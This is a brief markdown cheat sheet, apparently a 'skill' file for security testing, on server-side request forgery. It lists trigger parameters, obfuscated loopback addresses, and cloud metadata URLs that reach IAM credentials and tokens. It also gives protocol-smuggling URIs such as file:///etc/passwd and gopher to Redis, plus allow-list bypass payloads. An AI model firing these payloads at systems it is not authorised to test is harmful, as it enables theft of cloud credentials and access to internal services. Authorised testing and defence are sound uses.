# SKILL: ssrf
## Trigger Params
webhook_url, callback, import_from, avatar_url, url, file, image_url, next, redirect, preview, PDF/HTML render
## Internal
http://localhost
http://127.0.0.1
http://0x7f000001
http://2130706433
http://[::]
http://127.0.0.1.nip.io
http://[::ffff:7f00:1]/
## Cloud metadata
AWS: http://169.254.169.254/latest/meta-data/
AWS role: http://169.254.169.254//latest/meta-data/iam/security-credentials/
GCP: http://metadata.google.internal/computeMetadata/v1/ + header Metadata-Flavor: Google
Azure: http://169.254.169.254/metadata/identity/oauth2/token
## Protocol smuggling
file:///etc/passwd
gopher://127.0.0.1:6379/_PING
dict://
sftp://
ldap://
## Whitelist bypass
0://collab;target.com
0://collab:80;target.com:80
0://collab:80,target.com:80
0://evil$target.com
compress.zlib://target.com/../../../../etc/passwd
data://target.com/plain;base64,VHVoaW4=
http://google.com:11211:80/
## Triage
Metadata → Critical. Internal scan → High. Callback → Med.
